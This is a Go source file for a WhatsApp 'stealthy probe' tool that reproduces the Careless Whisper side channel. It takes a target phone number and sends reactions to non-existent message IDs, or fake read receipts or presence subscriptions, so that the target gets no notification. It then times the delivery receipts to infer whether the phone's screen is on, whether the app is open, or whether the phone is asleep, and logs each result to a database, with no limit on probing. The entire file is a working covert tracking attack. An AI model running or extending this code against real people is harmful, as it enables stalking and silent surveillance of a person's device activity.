package mapper

import (
	"context"
	"fmt"
	"sync"
	"sync/atomic"
	"time"

	"go.mau.fi/whatsmeow"
	"go.mau.fi/whatsmeow/proto/waCommon"
	"go.mau.fi/whatsmeow/proto/waE2E"
	"go.mau.fi/whatsmeow/types"
	"go.mau.fi/whatsmeow/types/events"
	waLog "go.mau.fi/whatsmeow/util/log"
	"google.golang.org/protobuf/proto"
)

// ProbeType defines the type of stealthy probe to use
type ProbeType string

const (
	// ProbeTypeReaction uses reactions to non-existent messages
	// This is the primary "stealthy" method from the Careless Whisper paper
	ProbeTypeReaction ProbeType = "reaction"

	// ProbeTypeReceipt uses read receipts (less stealthy but reliable)
	ProbeTypeReceipt ProbeType = "receipt"

	// ProbeTypePresence subscribes to presence updates
	ProbeTypePresence ProbeType = "presence"
)

// ProbeConfig configures the prober behavior
type ProbeConfig struct {
	// Target phone number (with country code, e.g., "1234567890")
	TargetPhone string

	// ProbeInterval is the time between probes
	ProbeInterval time.Duration

	// ProbeType specifies which probing method to use
	ProbeType ProbeType

	// MaxProbes limits the number of probes (0 = unlimited)
	MaxProbes int

	// Duration limits how long to probe (0 = unlimited)
	Duration time.Duration

	// StoreResults enables storing results to database
	StoreResults bool
}

// Prober handles stealthy probing of target devices
type Prober struct {
	client *whatsmeow.Client
	store  *MapperStore
	log    waLog.Logger

	config ProbeConfig

	// Tracking pending probes
	pendingProbes     map[string]*pendingProbe
	pendingProbesLock sync.RWMutex

	// Statistics
	totalProbes      atomic.Int64
	successfulProbes atomic.Int64

	// Control channels
	stopChan chan struct{}
	running  atomic.Bool
}

type pendingProbe struct {
	MessageID string
	SentAt    time.Time
	TargetJID types.JID
	ProbeType ProbeType
	// Server acknowledgement time (first hop)
	ServerAckAt time.Time
}

// NewProber creates a new prober instance
func NewProber(client *whatsmeow.Client, store *MapperStore, log waLog.Logger) *Prober {
	if log == nil {
		log = waLog.Noop
	}
	return &Prober{
		client:        client,
		store:         store,
		log:           log,
		pendingProbes: make(map[string]*pendingProbe),
		stopChan:      make(chan struct{}),
	}
}

// Start begins probing the target according to the config
func (p *Prober) Start(ctx context.Context, config ProbeConfig) error {
	if p.running.Load() {
		return fmt.Errorf("prober already running")
	}

	p.config = config
	p.running.Store(true)
	p.stopChan = make(chan struct{})
	p.totalProbes.Store(0)
	p.successfulProbes.Store(0)

	// Parse target JID
	targetJID, err := types.ParseJID(config.TargetPhone + "@s.whatsapp.net")
	if err != nil {
		return fmt.Errorf("invalid target phone: %w", err)
	}

	// Register event handler for receipts
	handlerID := p.client.AddEventHandler(p.handleEvent)
	defer p.client.RemoveEventHandler(handlerID)

	// Start a probe session in the database
	var sessionID int64
	if p.store != nil && config.StoreResults {
		session := &ProbeSession{
			TargetJID:       targetJID.String(),
			StartedAt:       time.Now(),
			ProbeIntervalMs: int(config.ProbeInterval.Milliseconds()),
			ProbeType:       string(config.ProbeType),
		}
		sessionID, _ = p.store.StartProbeSession(ctx, session)
	}

	p.log.Infof("Starting probe session for %s with interval %v", targetJID, config.ProbeInterval)

	ticker := time.NewTicker(config.ProbeInterval)
	defer ticker.Stop()

	var endTime time.Time
	if config.Duration > 0 {
		endTime = time.Now().Add(config.Duration)
	}

	for {
		select {
		case <-ctx.Done():
			p.running.Store(false)
			p.finishSession(ctx, sessionID)
			return ctx.Err()

		case <-p.stopChan:
			p.running.Store(false)
			p.finishSession(ctx, sessionID)
			return nil

		case <-ticker.C:
			// Check if we've exceeded duration
			if !endTime.IsZero() && time.Now().After(endTime) {
				p.running.Store(false)
				p.finishSession(ctx, sessionID)
				return nil
			}

			// Check if we've exceeded max probes
			if config.MaxProbes > 0 && int(p.totalProbes.Load()) >= config.MaxProbes {
				p.running.Store(false)
				p.finishSession(ctx, sessionID)
				return nil
			}

			// Send probe
			if err := p.sendProbe(ctx, targetJID); err != nil {
				p.log.Warnf("Failed to send probe: %v", err)
			}
		}
	}
}

// Stop stops the prober
func (p *Prober) Stop() {
	if p.running.Load() {
		close(p.stopChan)
	}
}

// GetStats returns current probe statistics
func (p *Prober) GetStats() (total int64, successful int64) {
	return p.totalProbes.Load(), p.successfulProbes.Load()
}

func (p *Prober) finishSession(ctx context.Context, sessionID int64) {
	if p.store != nil && sessionID > 0 {
		p.store.EndProbeSession(ctx, sessionID,
			int(p.totalProbes.Load()),
			int(p.successfulProbes.Load()))
	}
}

// sendProbe sends a stealthy probe to the target
func (p *Prober) sendProbe(ctx context.Context, targetJID types.JID) error {
	p.totalProbes.Add(1)

	switch p.config.ProbeType {
	case ProbeTypeReaction:
		return p.sendReactionProbe(ctx, targetJID)
	case ProbeTypeReceipt:
		return p.sendReceiptProbe(ctx, targetJID)
	case ProbeTypePresence:
		return p.sendPresenceProbe(ctx, targetJID)
	default:
		return p.sendReactionProbe(ctx, targetJID)
	}
}

// sendReactionProbe sends a reaction to a non-existent message
// This is the primary stealthy probing technique from the paper
// The reaction triggers a delivery receipt but shows no notification on the target
func (p *Prober) sendReactionProbe(ctx context.Context, targetJID types.JID) error {
	// Generate a fake message ID that doesn't exist
	// The target device will still send a delivery receipt
	fakeMessageID := p.client.GenerateMessageID()

	// Create a reaction message to this non-existent message
	reactionMsg := &waE2E.Message{
		ReactionMessage: &waE2E.ReactionMessage{
			Key: &waCommon.MessageKey{
				RemoteJID: proto.String(targetJID.String()),
				FromMe:    proto.Bool(false),
				ID:        proto.String(fakeMessageID),
			},
			Text:              proto.String("👍"), // The emoji doesn't matter
			SenderTimestampMS: proto.Int64(time.Now().UnixMilli()),
		},
	}

	// Record pending probe
	probe := &pendingProbe{
		MessageID: fakeMessageID,
		SentAt:    time.Now(),
		TargetJID: targetJID,
		ProbeType: ProbeTypeReaction,
	}

	p.pendingProbesLock.Lock()
	p.pendingProbes[fakeMessageID] = probe
	p.pendingProbesLock.Unlock()

	// Send the message
	resp, err := p.client.SendMessage(ctx, targetJID, reactionMsg)
	if err != nil {
		p.recordFailure(ctx, targetJID, probe, err)
		return fmt.Errorf("failed to send reaction probe: %w", err)
	}

	// Update probe with server response time
	probe.ServerAckAt = resp.Timestamp

	p.log.Debugf("Sent reaction probe %s to %s", fakeMessageID, targetJID)
	return nil
}

// sendReceiptProbe uses read receipt mechanism
func (p *Prober) sendReceiptProbe(ctx context.Context, targetJID types.JID) error {
	// Generate a fake message ID
	fakeMessageID := p.client.GenerateMessageID()

	probe := &pendingProbe{
		MessageID: fakeMessageID,
		SentAt:    time.Now(),
		TargetJID: targetJID,
		ProbeType: ProbeTypeReceipt,
	}

	p.pendingProbesLock.Lock()
	p.pendingProbes[fakeMessageID] = probe
	p.pendingProbesLock.Unlock()

	// Send a read receipt for a non-existent message
	err := p.client.MarkRead(ctx,
		[]types.MessageID{fakeMessageID},
		time.Now(),
		targetJID,
		types.EmptyJID,
	)
	if err != nil {
		p.recordFailure(ctx, targetJID, probe, err)
		return fmt.Errorf("failed to send receipt probe: %w", err)
	}

	// Note: This may not trigger a device receipt, reaction method is preferred

	p.log.Debugf("Sent receipt probe %s to %s", fakeMessageID, targetJID)
	return nil
}

// sendPresenceProbe subscribes to presence and measures response
func (p *Prober) sendPresenceProbe(ctx context.Context, targetJID types.JID) error {
	probe := &pendingProbe{
		MessageID: fmt.Sprintf("presence_%d", time.Now().UnixNano()),
		SentAt:    time.Now(),
		TargetJID: targetJID,
		ProbeType: ProbeTypePresence,
	}

	p.pendingProbesLock.Lock()
	p.pendingProbes[probe.MessageID] = probe
	p.pendingProbesLock.Unlock()

	err := p.client.SubscribePresence(ctx, targetJID)
	if err != nil {
		p.recordFailure(ctx, targetJID, probe, err)
		return fmt.Errorf("failed to subscribe to presence: %w", err)
	}

	p.log.Debugf("Sent presence probe to %s", targetJID)
	return nil
}

// handleEvent processes incoming events to measure RTT
func (p *Prober) handleEvent(evt interface{}) {
	switch v := evt.(type) {
	case *events.Receipt:
		p.handleReceipt(v)
	case *events.Presence:
		p.handlePresence(v)
	}
}

func (p *Prober) handleReceipt(receipt *events.Receipt) {
	receivedAt := time.Now()

	for _, msgID := range receipt.MessageIDs {
		p.pendingProbesLock.RLock()
		probe, exists := p.pendingProbes[msgID]
		p.pendingProbesLock.RUnlock()

		if !exists {
			continue
		}

		// Calculate RTT
		rtt := receivedAt.Sub(probe.SentAt)
		serverAck := probe.ServerAckAt.Sub(probe.SentAt)
		deviceAck := receivedAt.Sub(probe.ServerAckAt)

		p.successfulProbes.Add(1)

		// Store measurement
		measurement := &RTTMeasurement{
			TargetJID:   probe.TargetJID.String(),
			Timestamp:   probe.SentAt,
			RTTMs:       float64(rtt.Milliseconds()),
			ServerAckMs: float64(serverAck.Milliseconds()),
			DeviceAckMs: float64(deviceAck.Milliseconds()),
			ProbeType:   string(probe.ProbeType),
			Success:     true,
		}

		// Infer state based on RTT patterns
		measurement.InferredState = p.inferState(measurement.RTTMs)

		if p.store != nil && p.config.StoreResults {
			ctx := context.Background()
			if err := p.store.PutMeasurement(ctx, measurement); err != nil {
				p.log.Warnf("Failed to store measurement: %v", err)
			}
		}

		p.log.Infof("RTT for %s: %.2fms (server: %.2fms, device: %.2fms) - State: %s",
			probe.TargetJID, measurement.RTTMs, measurement.ServerAckMs,
			measurement.DeviceAckMs, measurement.InferredState)

		// Clean up
		p.pendingProbesLock.Lock()
		delete(p.pendingProbes, msgID)
		p.pendingProbesLock.Unlock()
	}
}

func (p *Prober) handlePresence(presence *events.Presence) {
	receivedAt := time.Now()

	p.pendingProbesLock.Lock()
	for id, probe := range p.pendingProbes {
		if probe.ProbeType == ProbeTypePresence && probe.TargetJID.User == presence.From.User {
			rtt := receivedAt.Sub(probe.SentAt)

			p.successfulProbes.Add(1)

			measurement := &RTTMeasurement{
				TargetJID: probe.TargetJID.String(),
				Timestamp: probe.SentAt,
				RTTMs:     float64(rtt.Milliseconds()),
				ProbeType: string(ProbeTypePresence),
				Success:   true,
			}

			// Presence gives direct online/offline state
			if presence.Unavailable {
				measurement.InferredState = "offline"
			} else {
				measurement.InferredState = "online"
			}

			if p.store != nil && p.config.StoreResults {
				ctx := context.Background()
				p.store.PutMeasurement(ctx, measurement)
			}

			p.log.Infof("Presence for %s: RTT %.2fms - State: %s (last seen: %v)",
				probe.TargetJID, measurement.RTTMs, measurement.InferredState, presence.LastSeen)

			delete(p.pendingProbes, id)
			break
		}
	}
	p.pendingProbesLock.Unlock()
}

func (p *Prober) recordFailure(ctx context.Context, targetJID types.JID, probe *pendingProbe, err error) {
	p.pendingProbesLock.Lock()
	delete(p.pendingProbes, probe.MessageID)
	p.pendingProbesLock.Unlock()

	if p.store != nil && p.config.StoreResults {
		measurement := &RTTMeasurement{
			TargetJID:    targetJID.String(),
			Timestamp:    probe.SentAt,
			ProbeType:    string(probe.ProbeType),
			Success:      false,
			ErrorMessage: err.Error(),
		}
		p.store.PutMeasurement(ctx, measurement)
	}
}

// inferState infers device state based on RTT patterns
// Based on Figure 1 and findings from the Careless Whisper paper
func (p *Prober) inferState(rttMs float64) string {
	// These thresholds are based on the paper's findings
	// Screen On: RTT typically < 1000ms
	// Screen Off: RTT typically > 1000ms, often 1500-3000ms+
	// App Foreground: Fastest RTTs, often < 500ms

	switch {
	case rttMs < 300:
		return "app_foreground" // App is actively open
	case rttMs < 1000:
		return "screen_on" // Phone is active but app not in foreground
	case rttMs < 3000:
		return "screen_off" // Phone screen is off
	case rttMs < 10000:
		return "doze_mode" // Phone is in power saving mode
	default:
		return "deep_sleep" // Extended delay, possibly no data connection
	}
}

// CleanupOldProbes removes pending probes older than timeout
func (p *Prober) CleanupOldProbes(timeout time.Duration) {
	cutoff := time.Now().Add(-timeout)

	p.pendingProbesLock.Lock()
	for id, probe := range p.pendingProbes {
		if probe.SentAt.Before(cutoff) {
			delete(p.pendingProbes, id)

			// Record as timeout
			if p.store != nil && p.config.StoreResults {
				ctx := context.Background()
				measurement := &RTTMeasurement{
					TargetJID:     probe.TargetJID.String(),
					Timestamp:     probe.SentAt,
					ProbeType:     string(probe.ProbeType),
					Success:       false,
					ErrorMessage:  "timeout",
					InferredState: "unreachable",
				}
				p.store.PutMeasurement(ctx, measurement)
			}
		}
	}
	p.pendingProbesLock.Unlock()
}
